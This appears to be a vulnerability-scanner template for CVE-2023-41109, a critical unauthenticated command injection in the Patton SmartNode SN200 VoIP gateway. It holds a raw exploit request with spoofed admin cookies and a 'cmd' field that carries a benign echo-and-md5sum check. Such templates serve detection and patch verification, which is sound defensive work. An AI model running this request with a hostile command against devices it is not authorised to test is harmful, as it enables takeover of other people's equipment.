id: CVE-2023-41109

info:
  name: SmartNode SN200 Analog Telephone Adapter (ATA) & VoIP Gateway - Command Injection
  author: princechaddha
  severity: critical
  description: |
    The SmartNode SN200 Analog Telephone Adapter (ATA) & VoIP Gateway is vulnerable to command injection.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary commands on the affected device.
  remediation: |
    Apply the latest firmware update provided by the vendor to mitigate this vulnerability.
  reference: |
    - https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2023-019.txt
    - https://nvd.nist.gov/vuln/detail/CVE-2023-41109
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-41109
    cwe-id: CWE-78
    epss-score: 0.0009
    epss-percentile: 0.37749
    cpe: cpe:2.3:o:patton:smartnode_sn200_firmware:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: patton
    product: smartnode_sn200_firmware
  tags: cve,cve2023,smartnode,voip

variables:
  payload: "echo CVE-2023-41109 | md5sum"

http:
  - raw:
      - |
        POST /rest/xxxxxxxxxxxxxxx/xxxxxxx?executeAsync HTTP/1.1
        Host: {{Hostname}}
        Cookie: AuthToken=; AuthGroup=superuser; UserName=admin

        {"cmd":"{{payload}}","arguments":[]}

    matchers:
      - type: word
        part: body
        words:
          - "dd556350275e2ee0a2e877cea9c8a74a"
# digest: 490a00463044022027fbef743a3162511f9d6d9814e8b456183b308ebff31ef264a25d3995cc07c20220548b348afe5fa2b25a8d77072b0f9baa2e4bcd20b95b5c7317c278ef550d33f7:922c64590222798bb761d5b6d8e72950